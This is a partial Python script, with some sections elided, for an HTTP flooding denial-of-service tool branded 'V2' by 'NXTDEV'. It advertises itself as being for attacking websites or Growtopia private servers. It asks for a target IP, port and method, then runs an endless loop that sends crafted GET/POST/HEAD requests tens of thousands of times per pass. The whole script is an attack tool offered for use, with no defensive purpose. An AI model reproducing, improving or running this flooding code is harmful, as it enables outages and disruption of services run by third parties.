...
import sys
os.system("color 4")
os.system(f"title V2 Made By NXTDEV")
kevin = "NXT"

for i in range(3):
    pwd = input("[V2] Password Require: ")
    j = 3
    if (pwd == kevin):
        print("[V2] Checking Password [V2]\n")
        break
    else:
        time.sleep(5)
        print("[V2] Invalid Password [V2]\n")
        continue
time.sleep(2)
print("[V2] Welcome To Tools V2 [V2]")
time.sleep(2)
...
os.system("cls")
print("[V2] Credit: Nguyen Xuan Truong [V2]")
print("|=====================================|")
print("[V2] For Attack Website Or Gtps [V2]")
print("|=====================================|")
print("[V2] Version | V2 | Kalo Gwe Niat Tar Gw Update Lagi [V2]")
print("|=====================================|")

print()
ip = str(input("[V2] Input IP Target: "))
port = int(input("[V2] Port Target: "))
method_attack = str(input("[V2] Head | Get | Post | Soon: "))
fake_ip =['127.0.0.1',
          '1.1.1.1',
          '20.218.213.64',
          ]
...
def tcpping(ip,port):
    try:
        ...
        print(f"[LOGS] Connection {ip} on {port} its up!!!")
        time.sleep(3)
    except:
        print(f"[LOGS] Connection {ip} on {port} its down!!!")
        time.sleep(3)
...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST | Get Attack From V2 /1.1\r\nServer " + ip + "\r\n"
...
def run():
    ...
    if method_attack == "1":
        get_host = "GET /Attack From V2/1.1\r\nServer " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Get Attack From V2/1.1\r\nServer " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            for x in range(60000):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(i +"[V2] Sending Attack [V2]")
        except socket.error:
            s.close()
            print("[V2] Attack LOGS",ip,":",port,"[NXT]")
